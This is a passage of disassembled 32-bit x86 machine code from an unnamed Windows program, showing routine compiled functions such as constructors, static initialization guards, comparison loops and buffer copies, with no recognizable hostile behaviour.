  401d53:	5e                   	pop    %esi
  401d54:	8b e5                	mov    %ebp,%esp
  401d56:	5d                   	pop    %ebp
  401d57:	c3                   	ret
  401d58:	cc                   	int3
  401d59:	cc                   	int3
  401d5a:	cc                   	int3
  401d5b:	cc                   	int3
  401d5c:	cc                   	int3
  401d5d:	cc                   	int3
  401d5e:	cc                   	int3
  401d5f:	cc                   	int3
  401d60:	55                   	push   %ebp
  401d61:	8b ec                	mov    %esp,%ebp
  401d63:	56                   	push   %esi
  401d64:	8b f1                	mov    %ecx,%esi
  401d66:	e8 b5 fe ff ff       	call   0x401c20
  401d6b:	8b 45 08             	mov    0x8(%ebp),%eax
  401d6e:	a8 01                	test   $0x1,%al
  401d70:	74 1d                	je     0x401d8f
  401d72:	a8 04                	test   $0x4,%al
  401d74:	75 0e                	jne    0x401d84
  401d76:	8b ce                	mov    %esi,%ecx
  401d78:	e8 d3 97 01 00       	call   0x41b550
  401d7d:	8b c6                	mov    %esi,%eax
  401d7f:	5e                   	pop    %esi
  401d80:	5d                   	pop    %ebp
  401d81:	c2 04 00             	ret    $0x4
  401d84:	6a 2c                	push   $0x2c
  401d86:	56                   	push   %esi
  401d87:	e8 f4 f8 ff ff       	call   0x401680
  401d8c:	83 c4 08             	add    $0x8,%esp
  401d8f:	8b c6                	mov    %esi,%eax
  401d91:	5e                   	pop    %esi
  401d92:	5d                   	pop    %ebp
  401d93:	c2 04 00             	ret    $0x4
  401d96:	cc                   	int3
  401d97:	cc                   	int3
  401d98:	cc                   	int3
  401d99:	cc                   	int3
  401d9a:	cc                   	int3
  401d9b:	cc                   	int3
  401d9c:	cc                   	int3
  401d9d:	cc                   	int3
  401d9e:	cc                   	int3
  401d9f:	cc                   	int3
  401da0:	55                   	push   %ebp
  401da1:	8b ec                	mov    %esp,%ebp
  401da3:	6a ff                	push   $0xffffffff
  401da5:	68 11 ef 42 00       	push   $0x42ef11
  401daa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401db0:	50                   	push   %eax
  401db1:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401db6:	33 c5                	xor    %ebp,%eax
  401db8:	50                   	push   %eax
  401db9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401dbc:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401dc2:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  401dc8:	8b 08                	mov    (%eax),%ecx
  401dca:	a1 dc 65 44 00       	mov    0x4465dc,%eax
  401dcf:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  401dd5:	7f 14                	jg     0x401deb
  401dd7:	b8 e0 65 44 00       	mov    $0x4465e0,%eax
  401ddc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ddf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401de6:	59                   	pop    %ecx
  401de7:	8b e5                	mov    %ebp,%esp
  401de9:	5d                   	pop    %ebp
  401dea:	c3                   	ret
  401deb:	68 dc 65 44 00       	push   $0x4465dc
  401df0:	e8 ff bd 02 00       	call   0x42dbf4
  401df5:	83 c4 04             	add    $0x4,%esp
  401df8:	83 3d dc 65 44 00 ff 	cmpl   $0xffffffff,0x4465dc
  401dff:	75 d6                	jne    0x401dd7
  401e01:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401e08:	b9 e4 65 44 00       	mov    $0x4465e4,%ecx
  401e0d:	68 ac 5c 43 00       	push   $0x435cac
  401e12:	c7 05 e0 65 44 00 b0 	movl   $0x4019b0,0x4465e0
  401e19:	19 40 00 
  401e1c:	e8 0f 0e 00 00       	call   0x402c30
  401e21:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401e28:	68 dc 65 44 00       	push   $0x4465dc
  401e2d:	e8 78 bd 02 00       	call   0x42dbaa
  401e32:	83 c4 04             	add    $0x4,%esp
  401e35:	eb a0                	jmp    0x401dd7
  401e37:	cc                   	int3
  401e38:	cc                   	int3
  401e39:	cc                   	int3
  401e3a:	cc                   	int3
  401e3b:	cc                   	int3
  401e3c:	cc                   	int3
  401e3d:	cc                   	int3
  401e3e:	cc                   	int3
  401e3f:	cc                   	int3
  401e40:	55                   	push   %ebp
  401e41:	8b ec                	mov    %esp,%ebp
  401e43:	56                   	push   %esi
  401e44:	e8 57 ff ff ff       	call   0x401da0
  401e49:	8b 75 08             	mov    0x8(%ebp),%esi
  401e4c:	3b f0                	cmp    %eax,%esi
  401e4e:	74 58                	je     0x401ea8
  401e50:	8b 48 0c             	mov    0xc(%eax),%ecx
  401e53:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  401e56:	75 1c                	jne    0x401e74
  401e58:	8b 4e 08             	mov    0x8(%esi),%ecx
  401e5b:	39 48 08             	cmp    %ecx,0x8(%eax)
  401e5e:	75 14                	jne    0x401e74
  401e60:	51                   	push   %ecx
  401e61:	ff 76 04             	push   0x4(%esi)
  401e64:	ff 70 04             	push   0x4(%eax)
  401e67:	ff 15 c4 54 43 00    	call   *0x4354c4
  401e6d:	83 c4 0c             	add    $0xc,%esp
  401e70:	85 c0                	test   %eax,%eax
  401e72:	74 34                	je     0x401ea8
  401e74:	e8 c7 0c 00 00       	call   0x402b40
  401e79:	3b f0                	cmp    %eax,%esi
  401e7b:	74 2b                	je     0x401ea8
  401e7d:	8b 48 0c             	mov    0xc(%eax),%ecx
  401e80:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  401e83:	75 1c                	jne    0x401ea1
  401e85:	8b 4e 08             	mov    0x8(%esi),%ecx
  401e88:	39 48 08             	cmp    %ecx,0x8(%eax)
  401e8b:	75 14                	jne    0x401ea1
  401e8d:	51                   	push   %ecx
  401e8e:	ff 76 04             	push   0x4(%esi)
  401e91:	ff 70 04             	push   0x4(%eax)
  401e94:	ff 15 c4 54 43 00    	call   *0x4354c4
  401e9a:	83 c4 0c             	add    $0xc,%esp
  401e9d:	85 c0                	test   %eax,%eax
  401e9f:	74 07                	je     0x401ea8
  401ea1:	33 c0                	xor    %eax,%eax
  401ea3:	5e                   	pop    %esi
  401ea4:	5d                   	pop    %ebp
  401ea5:	c2 04 00             	ret    $0x4
  401ea8:	b8 01 00 00 00       	mov    $0x1,%eax
  401ead:	5e                   	pop    %esi
  401eae:	5d                   	pop    %ebp
  401eaf:	c2 04 00             	ret    $0x4
  401eb2:	cc                   	int3
  401eb3:	cc                   	int3
  401eb4:	cc                   	int3
  401eb5:	cc                   	int3
  401eb6:	cc                   	int3
  401eb7:	cc                   	int3
  401eb8:	cc                   	int3
  401eb9:	cc                   	int3
  401eba:	cc                   	int3
  401ebb:	cc                   	int3
  401ebc:	cc                   	int3
  401ebd:	cc                   	int3
  401ebe:	cc                   	int3
  401ebf:	cc                   	int3
  401ec0:	55                   	push   %ebp
  401ec1:	8b ec                	mov    %esp,%ebp
  401ec3:	56                   	push   %esi
  401ec4:	8b 71 0c             	mov    0xc(%ecx),%esi
  401ec7:	57                   	push   %edi
  401ec8:	85 f6                	test   %esi,%esi
  401eca:	75 0d                	jne    0x401ed9
  401ecc:	39 71 24             	cmp    %esi,0x24(%ecx)
  401ecf:	be c0 57 43 00       	mov    $0x4357c0,%esi
  401ed4:	74 03                	je     0x401ed9
  401ed6:	8b 71 1c             	mov    0x1c(%ecx),%esi
  401ed9:	8b 45 08             	mov    0x8(%ebp),%eax
  401edc:	8d 78 10             	lea    0x10(%eax),%edi
  401edf:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  401ee6:	8b 4f 0c             	mov    0xc(%edi),%ecx
  401ee9:	85 c9                	test   %ecx,%ecx
  401eeb:	74 08                	je     0x401ef5
  401eed:	8b 07                	mov    (%edi),%eax
  401eef:	51                   	push   %ecx
  401ef0:	8b cf                	mov    %edi,%ecx
  401ef2:	ff 50 0c             	call   *0xc(%eax)
  401ef5:	c7 47 0c 00 00 00 00 	movl   $0x0,0xc(%edi)
  401efc:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  401f03:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  401f0a:	85 f6                	test   %esi,%esi
  401f0c:	74 0e                	je     0x401f1c
  401f0e:	66 83 3e 00          	cmpw   $0x0,(%esi)
  401f12:	74 08                	je     0x401f1c
  401f14:	56                   	push   %esi
  401f15:	8b cf                	mov    %edi,%ecx
  401f17:	e8 84 b6 01 00       	call   0x41d5a0
  401f1c:	5f                   	pop    %edi
  401f1d:	5e                   	pop    %esi
  401f1e:	5d                   	pop    %ebp
  401f1f:	c2 08 00             	ret    $0x8
  401f22:	cc                   	int3
  401f23:	cc                   	int3
  401f24:	cc                   	int3
  401f25:	cc                   	int3
  401f26:	cc                   	int3
  401f27:	cc                   	int3
  401f28:	cc                   	int3
  401f29:	cc                   	int3
  401f2a:	cc                   	int3
  401f2b:	cc                   	int3
  401f2c:	cc                   	int3
  401f2d:	cc                   	int3
  401f2e:	cc                   	int3
  401f2f:	cc                   	int3
  401f30:	e9 5b 06 00 00       	jmp    0x402590
  401f35:	cc                   	int3
  401f36:	cc                   	int3
  401f37:	cc                   	int3
  401f38:	cc                   	int3
  401f39:	cc                   	int3
  401f3a:	cc                   	int3
  401f3b:	cc                   	int3
  401f3c:	cc                   	int3
  401f3d:	cc                   	int3
  401f3e:	cc                   	int3
  401f3f:	cc                   	int3
  401f40:	55                   	push   %ebp
  401f41:	8b ec                	mov    %esp,%ebp
  401f43:	53                   	push   %ebx
  401f44:	56                   	push   %esi
  401f45:	57                   	push   %edi
  401f46:	8b f9                	mov    %ecx,%edi
  401f48:	e8 43 06 00 00       	call   0x402590
  401f4d:	8b 75 08             	mov    0x8(%ebp),%esi
  401f50:	8b d8                	mov    %eax,%ebx
  401f52:	8b ce                	mov    %esi,%ecx
  401f54:	8b 16                	mov    (%esi),%edx
  401f56:	ff 52 14             	call   *0x14(%edx)
  401f59:	3b d8                	cmp    %eax,%ebx
  401f5b:	74 2c                	je     0x401f89
  401f5d:	8b 48 0c             	mov    0xc(%eax),%ecx
  401f60:	3b 4b 0c             	cmp    0xc(%ebx),%ecx
  401f63:	0f 85 96 00 00 00    	jne    0x401fff
  401f69:	8b 4b 08             	mov    0x8(%ebx),%ecx
  401f6c:	39 48 08             	cmp    %ecx,0x8(%eax)
  401f6f:	0f 85 8a 00 00 00    	jne    0x401fff
  401f75:	51                   	push   %ecx
  401f76:	ff 73 04             	push   0x4(%ebx)
  401f79:	ff 70 04             	push   0x4(%eax)
  401f7c:	ff 15 c4 54 43 00    	call   *0x4354c4
  401f82:	83 c4 0c             	add    $0xc,%esp
  401f85:	85 c0                	test   %eax,%eax
  401f87:	75 76                	jne    0x401fff
  401f89:	8b 46 04             	mov    0x4(%esi),%eax
  401f8c:	33 47 04             	xor    0x4(%edi),%eax
  401f8f:	a8 01                	test   $0x1,%al
  401f91:	75 6c                	jne    0x401fff
  401f93:	8b 47 08             	mov    0x8(%edi),%eax
  401f96:	3b 46 08             	cmp    0x8(%esi),%eax
  401f99:	75 64                	jne    0x401fff
  401f9b:	8b 4f 14             	mov    0x14(%edi),%ecx
  401f9e:	3b 4e 14             	cmp    0x14(%esi),%ecx
  401fa1:	75 5c                	jne    0x401fff
  401fa3:	8b 57 0c             	mov    0xc(%edi),%edx
  401fa6:	8b 76 0c             	mov    0xc(%esi),%esi
  401fa9:	83 e9 04             	sub    $0x4,%ecx
  401fac:	72 13                	jb     0x401fc1
  401fae:	66 90                	xchg   %ax,%ax
  401fb0:	8b 02                	mov    (%edx),%eax
  401fb2:	3b 06                	cmp    (%esi),%eax
  401fb4:	75 10                	jne    0x401fc6
  401fb6:	83 c2 04             	add    $0x4,%edx
  401fb9:	83 c6 04             	add    $0x4,%esi
  401fbc:	83 e9 04             	sub    $0x4,%ecx
  401fbf:	73 ef                	jae    0x401fb0
  401fc1:	83 f9 fc             	cmp    $0xfffffffc,%ecx
  401fc4:	74 2d                	je     0x401ff3
  401fc6:	8a 02                	mov    (%edx),%al
  401fc8:	3a 06                	cmp    (%esi),%al
  401fca:	75 33                	jne    0x401fff
  401fcc:	83 f9 fd             	cmp    $0xfffffffd,%ecx
  401fcf:	74 22                	je     0x401ff3
  401fd1:	8a 42 01             	mov    0x1(%edx),%al
  401fd4:	3a 46 01             	cmp    0x1(%esi),%al
  401fd7:	75 26                	jne    0x401fff
  401fd9:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  401fdc:	74 15                	je     0x401ff3
  401fde:	8a 42 02             	mov    0x2(%edx),%al
  401fe1:	3a 46 02             	cmp    0x2(%esi),%al
  401fe4:	75 19                	jne    0x401fff
  401fe6:	83 f9 ff             	cmp    $0xffffffff,%ecx
  401fe9:	74 08                	je     0x401ff3
  401feb:	8a 42 03             	mov    0x3(%edx),%al
  401fee:	3a 46 03             	cmp    0x3(%esi),%al
  401ff1:	75 0c                	jne    0x401fff
  401ff3:	5f                   	pop    %edi
  401ff4:	5e                   	pop    %esi
  401ff5:	b8 01 00 00 00       	mov    $0x1,%eax
  401ffa:	5b                   	pop    %ebx
  401ffb:	5d                   	pop    %ebp
  401ffc:	c2 04 00             	ret    $0x4
  401fff:	5f                   	pop    %edi
  402000:	5e                   	pop    %esi
  402001:	33 c0                	xor    %eax,%eax
  402003:	5b                   	pop    %ebx
  402004:	5d                   	pop    %ebp
  402005:	c2 04 00             	ret    $0x4
  402008:	cc                   	int3
  402009:	cc                   	int3
  40200a:	cc                   	int3
  40200b:	cc                   	int3
  40200c:	cc                   	int3
  40200d:	cc                   	int3
  40200e:	cc                   	int3
  40200f:	cc                   	int3
  402010:	55                   	push   %ebp
  402011:	8b ec                	mov    %esp,%ebp
  402013:	6a ff                	push   $0xffffffff
  402015:	68 45 ef 42 00       	push   $0x42ef45
  40201a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402020:	50                   	push   %eax
  402021:	51                   	push   %ecx
  402022:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402027:	33 c5                	xor    %ebp,%eax
  402029:	50                   	push   %eax
  40202a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40202d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402033:	83 3d c8 69 44 00 1c 	cmpl   $0x1c,0x4469c8
  40203a:	7c 2c                	jl     0x402068
  40203c:	68 cc 69 44 00       	push   $0x4469cc
  402041:	e8 ba bc 01 00       	call   0x41dd00
  402046:	8b 0d c4 69 44 00    	mov    0x4469c4,%ecx
  40204c:	83 c4 04             	add    $0x4,%esp
  40204f:	85 c9                	test   %ecx,%ecx
  402051:	74 07                	je     0x40205a
  402053:	8b 01                	mov    (%ecx),%eax
  402055:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  40205a:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  402061:	00 00 00 
  402064:	85 c9                	test   %ecx,%ecx
  402066:	75 1f                	jne    0x402087
  402068:	6a 1c                	push   $0x1c
  40206a:	6a 00                	push   $0x0
  40206c:	ff 15 d8 51 43 00    	call   *0x4351d8
  402072:	50                   	push   %eax
  402073:	ff 15 e8 51 43 00    	call   *0x4351e8
  402079:	8b c8                	mov    %eax,%ecx
  40207b:	85 c9                	test   %ecx,%ecx
  40207d:	75 08                	jne    0x402087
  40207f:	6a ff                	push   $0xffffffff
  402081:	ff 15 4c 54 43 00    	call   *0x43544c
  402087:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40208a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402091:	c7 01 74 5d 43 00    	movl   $0x435d74,(%ecx)
  402097:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40209e:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  4020a5:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4020a9:	c7 01 10 5d 43 00    	movl   $0x435d10,(%ecx)
  4020af:	c7 41 0c 00 00 00 00 	movl   $0x0,0xc(%ecx)
  4020b6:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  4020bd:	c7 41 10 00 00 00 00 	movl   $0x0,0x10(%ecx)
  4020c4:	c7 41 18 40 00 00 00 	movl   $0x40,0x18(%ecx)
  4020cb:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4020d2:	8b c1                	mov    %ecx,%eax
  4020d4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4020d7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4020de:	59                   	pop    %ecx
  4020df:	8b e5                	mov    %ebp,%esp
  4020e1:	5d                   	pop    %ebp
  4020e2:	c3                   	ret
  4020e3:	cc                   	int3
  4020e4:	cc                   	int3
  4020e5:	cc                   	int3
  4020e6:	cc                   	int3
  4020e7:	cc                   	int3
  4020e8:	cc                   	int3
  4020e9:	cc                   	int3
  4020ea:	cc                   	int3
  4020eb:	cc                   	int3
  4020ec:	cc                   	int3
  4020ed:	cc                   	int3
  4020ee:	cc                   	int3
  4020ef:	cc                   	int3
  4020f0:	55                   	push   %ebp
  4020f1:	8b ec                	mov    %esp,%ebp
  4020f3:	6a ff                	push   $0xffffffff
  4020f5:	68 85 ef 42 00       	push   $0x42ef85
  4020fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402100:	50                   	push   %eax
  402101:	51                   	push   %ecx
  402102:	56                   	push   %esi
  402103:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402108:	33 c5                	xor    %ebp,%eax
  40210a:	50                   	push   %eax
  40210b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40210e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402114:	8b f1                	mov    %ecx,%esi
  402116:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402119:	c7 06 74 5d 43 00    	movl   $0x435d74,(%esi)
  40211f:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402126:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40212d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402134:	c7 06 10 5d 43 00    	movl   $0x435d10,(%esi)
  40213a:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  402141:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  402148:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40214f:	c7 46 18 40 00 00 00 	movl   $0x40,0x18(%esi)
  402156:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40215d:	ff 75 08             	push   0x8(%ebp)
  402160:	c7 06 10 5d 43 00    	movl   $0x435d10,(%esi)
  402166:	e8 15 01 00 00       	call   0x402280
  40216b:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402172:	8b c6                	mov    %esi,%eax
  402174:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402177:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40217e:	59                   	pop    %ecx
  40217f:	5e                   	pop    %esi
  402180:	8b e5                	mov    %ebp,%esp
  402182:	5d                   	pop    %ebp
  402183:	c2 04 00             	ret    $0x4
  402186:	cc                   	int3
  402187:	cc                   	int3
  402188:	cc                   	int3
  402189:	cc                   	int3
  40218a:	cc                   	int3
  40218b:	cc                   	int3
  40218c:	cc                   	int3
  40218d:	cc                   	int3
  40218e:	cc                   	int3
  40218f:	cc                   	int3
  402190:	55                   	push   %ebp
  402191:	8b ec                	mov    %esp,%ebp
  402193:	6a ff                	push   $0xffffffff
  402195:	68 bd ef 42 00       	push   $0x42efbd
  40219a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4021a0:	50                   	push   %eax
  4021a1:	51                   	push   %ecx
  4021a2:	56                   	push   %esi
  4021a3:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4021a8:	33 c5                	xor    %ebp,%eax
  4021aa:	50                   	push   %eax
  4021ab:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4021ae:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4021b4:	8b f1                	mov    %ecx,%esi
  4021b6:	83 3d c8 69 44 00 1c 	cmpl   $0x1c,0x4469c8
  4021bd:	7c 2c                	jl     0x4021eb
  4021bf:	68 cc 69 44 00       	push   $0x4469cc
  4021c4:	e8 37 bb 01 00       	call   0x41dd00
  4021c9:	8b 0d c4 69 44 00    	mov    0x4469c4,%ecx
  4021cf:	83 c4 04             	add    $0x4,%esp
  4021d2:	85 c9                	test   %ecx,%ecx
  4021d4:	74 07                	je     0x4021dd
  4021d6:	8b 01                	mov    (%ecx),%eax
  4021d8:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  4021dd:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  4021e4:	00 00 00 
  4021e7:	85 c9                	test   %ecx,%ecx
  4021e9:	75 1f                	jne    0x40220a
  4021eb:	6a 1c                	push   $0x1c
  4021ed:	6a 00                	push   $0x0
  4021ef:	ff 15 d8 51 43 00    	call   *0x4351d8
  4021f5:	50                   	push   %eax
  4021f6:	ff 15 e8 51 43 00    	call   *0x4351e8
  4021fc:	8b c8                	mov    %eax,%ecx
  4021fe:	85 c9                	test   %ecx,%ecx
  402200:	75 08                	jne    0x40220a
  402202:	6a ff                	push   $0xffffffff
  402204:	ff 15 4c 54 43 00    	call   *0x43544c
  40220a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40220d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402214:	56                   	push   %esi
  402215:	e8 d6 fe ff ff       	call   0x4020f0
  40221a:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402221:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402224:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40222b:	59                   	pop    %ecx
  40222c:	5e                   	pop    %esi
  40222d:	8b e5                	mov    %ebp,%esp
  40222f:	5d                   	pop    %ebp
  402230:	c3                   	ret
  402231:	cc                   	int3
  402232:	cc                   	int3
  402233:	cc                   	int3
  402234:	cc                   	int3
  402235:	cc                   	int3
  402236:	cc                   	int3
  402237:	cc                   	int3
  402238:	cc                   	int3
  402239:	cc                   	int3
  40223a:	cc                   	int3
  40223b:	cc                   	int3
  40223c:	cc                   	int3
  40223d:	cc                   	int3
  40223e:	cc                   	int3
  40223f:	cc                   	int3
  402240:	55                   	push   %ebp
  402241:	8b ec                	mov    %esp,%ebp
  402243:	53                   	push   %ebx
  402244:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402247:	56                   	push   %esi
  402248:	57                   	push   %edi
  402249:	8b f9                	mov    %ecx,%edi
  40224b:	8b 33                	mov    (%ebx),%esi
  40224d:	e8 3e 03 00 00       	call   0x402590
  402252:	50                   	push   %eax
  402253:	8b cb                	mov    %ebx,%ecx
  402255:	ff 56 34             	call   *0x34(%esi)
  402258:	85 c0                	test   %eax,%eax
  40225a:	74 1b                	je     0x402277
  40225c:	8b 07                	mov    (%edi),%eax
  40225e:	8b cf                	mov    %edi,%ecx
  402260:	ff 50 44             	call   *0x44(%eax)
  402263:	53                   	push   %ebx
  402264:	8b cf                	mov    %edi,%ecx
  402266:	e8 15 00 00 00       	call   0x402280
  40226b:	5f                   	pop    %edi
  40226c:	5e                   	pop    %esi
  40226d:	b8 01 00 00 00       	mov    $0x1,%eax
  402272:	5b                   	pop    %ebx
  402273:	5d                   	pop    %ebp
  402274:	c2 04 00             	ret    $0x4
  402277:	5f                   	pop    %edi
  402278:	5e                   	pop    %esi
  402279:	33 c0                	xor    %eax,%eax
  40227b:	5b                   	pop    %ebx
  40227c:	5d                   	pop    %ebp
  40227d:	c2 04 00             	ret    $0x4
  402280:	55                   	push   %ebp
  402281:	8b ec                	mov    %esp,%ebp
  402283:	83 ec 08             	sub    $0x8,%esp
  402286:	56                   	push   %esi
  402287:	8b 75 08             	mov    0x8(%ebp),%esi
  40228a:	57                   	push   %edi
  40228b:	8b 46 04             	mov    0x4(%esi),%eax
  40228e:	89 41 04             	mov    %eax,0x4(%ecx)
  402291:	8b 46 08             	mov    0x8(%esi),%eax
  402294:	89 41 08             	mov    %eax,0x8(%ecx)
  402297:	8b 7e 14             	mov    0x14(%esi),%edi
  40229a:	85 ff                	test   %edi,%edi
  40229c:	75 04                	jne    0x4022a2
  40229e:	33 f6                	xor    %esi,%esi
  4022a0:	eb 03                	jmp    0x4022a5
  4022a2:	8b 76 0c             	mov    0xc(%esi),%esi
  4022a5:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  4022ac:	39 79 10             	cmp    %edi,0x10(%ecx)
  4022af:	0f 8c cf 00 00 00    	jl     0x402384
  4022b5:	83 ff 01             	cmp    $0x1,%edi
  4022b8:	75 28                	jne    0x4022e2
  4022ba:	85 f6                	test   %esi,%esi
  4022bc:	75 12                	jne    0x4022d0
  4022be:	8b 41 0c             	mov    0xc(%ecx),%eax
  4022c1:	32 d2                	xor    %dl,%dl
  4022c3:	5f                   	pop    %edi
  4022c4:	5e                   	pop    %esi
  4022c5:	88 10                	mov    %dl,(%eax)
  4022c7:	ff 41 14             	incl   0x14(%ecx)
  4022ca:	8b e5                	mov    %ebp,%esp
  4022cc:	5d                   	pop    %ebp
  4022cd:	c2 04 00             	ret    $0x4
  4022d0:	8b 41 0c             	mov    0xc(%ecx),%eax
  4022d3:	8a 16                	mov    (%esi),%dl
  4022d5:	5f                   	pop    %edi
  4022d6:	5e                   	pop    %esi
  4022d7:	88 10                	mov    %dl,(%eax)
  4022d9:	ff 41 14             	incl   0x14(%ecx)
  4022dc:	8b e5                	mov    %ebp,%esp
  4022de:	5d                   	pop    %ebp
  4022df:	c2 04 00             	ret    $0x4
  4022e2:	83 ff 02             	cmp    $0x2,%edi
  4022e5:	75 2c                	jne    0x402313
  4022e7:	85 f6                	test   %esi,%esi
  4022e9:	75 13                	jne    0x4022fe
  4022eb:	8b 41 0c             	mov    0xc(%ecx),%eax
  4022ee:	33 d2                	xor    %edx,%edx
  4022f0:	66 89 10             	mov    %dx,(%eax)
  4022f3:	01 79 14             	add    %edi,0x14(%ecx)
  4022f6:	5f                   	pop    %edi
  4022f7:	5e                   	pop    %esi
  4022f8:	8b e5                	mov    %ebp,%esp
  4022fa:	5d                   	pop    %ebp
  4022fb:	c2 04 00             	ret    $0x4
  4022fe:	8b 41 0c             	mov    0xc(%ecx),%eax
  402301:	0f b7 16             	movzwl (%esi),%edx
  402304:	5f                   	pop    %edi
  402305:	5e                   	pop    %esi
  402306:	66 89 10             	mov    %dx,(%eax)
  402309:	83 41 14 02          	addl   $0x2,0x14(%ecx)
  40230d:	8b e5                	mov    %ebp,%esp
  40230f:	5d                   	pop    %ebp
  402310:	c2 04 00             	ret    $0x4
  402313:	83 ff 04             	cmp    $0x4,%edi
  402316:	75 29                	jne    0x402341
  402318:	85 f6                	test   %esi,%esi
  40231a:	75 12                	jne    0x40232e
  40231c:	8b 41 0c             	mov    0xc(%ecx),%eax
  40231f:	33 d2                	xor    %edx,%edx
  402321:	89 10                	mov    %edx,(%eax)
  402323:	01 79 14             	add    %edi,0x14(%ecx)
  402326:	5f                   	pop    %edi
  402327:	5e                   	pop    %esi
  402328:	8b e5                	mov    %ebp,%esp
  40232a:	5d                   	pop    %ebp
  40232b:	c2 04 00             	ret    $0x4
  40232e:	8b 41 0c             	mov    0xc(%ecx),%eax
  402331:	8b 16                	mov    (%esi),%edx
  402333:	5f                   	pop    %edi
  402334:	5e                   	pop    %esi
  402335:	89 10                	mov    %edx,(%eax)
  402337:	83 41 14 04          	addl   $0x4,0x14(%ecx)
  40233b:	8b e5                	mov    %ebp,%esp
  40233d:	5d                   	pop    %ebp
  40233e:	c2 04 00             	ret    $0x4
  402341:	83 ff 08             	cmp    $0x8,%edi
  402344:	75 3e                	jne    0x402384
  402346:	85 f6                	test   %esi,%esi
  402348:	75 21                	jne    0x40236b
  40234a:	8b 41 0c             	mov    0xc(%ecx),%eax
  40234d:	0f 57 c0             	xorps  %xmm0,%xmm0
  402350:	66 0f 13 45 f8       	movlpd %xmm0,-0x8(%ebp)
  402355:	8b 75 fc             	mov    -0x4(%ebp),%esi
  402358:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40235b:	89 10                	mov    %edx,(%eax)
  40235d:	89 70 04             	mov    %esi,0x4(%eax)
  402360:	01 79 14             	add    %edi,0x14(%ecx)
  402363:	5f                   	pop    %edi
  402364:	5e                   	pop    %esi
  402365:	8b e5                	mov    %ebp,%esp
  402367:	5d                   	pop    %ebp
  402368:	c2 04 00             	ret    $0x4
  40236b:	8b 16                	mov    (%esi),%edx
  40236d:	8b 41 0c             	mov    0xc(%ecx),%eax
  402370:	8b 76 04             	mov    0x4(%esi),%esi
  402373:	5f                   	pop    %edi
  402374:	89 10                	mov    %edx,(%eax)
  402376:	89 70 04             	mov    %esi,0x4(%eax)
  402379:	83 41 14 08          	addl   $0x8,0x14(%ecx)
  40237d:	5e                   	pop    %esi
  40237e:	8b e5                	mov    %ebp,%esp
  402380:	5d                   	pop    %ebp
  402381:	c2 04 00             	ret    $0x4
  402384:	85 ff                	test   %edi,%edi
  402386:	7e 28                	jle    0x4023b0
  402388:	57                   	push   %edi
  402389:	e8 62 b1 01 00       	call   0x41d4f0
  40238e:	57                   	push   %edi
  40238f:	85 f6                	test   %esi,%esi
  402391:	74 12                	je     0x4023a5
  402393:	56                   	push   %esi
  402394:	50                   	push   %eax
  402395:	e8 e1 c8 02 00       	call   0x42ec7b
  40239a:	83 c4 0c             	add    $0xc,%esp
  40239d:	5f                   	pop    %edi
  40239e:	5e                   	pop    %esi
  40239f:	8b e5                	mov    %ebp,%esp
  4023a1:	5d                   	pop    %ebp
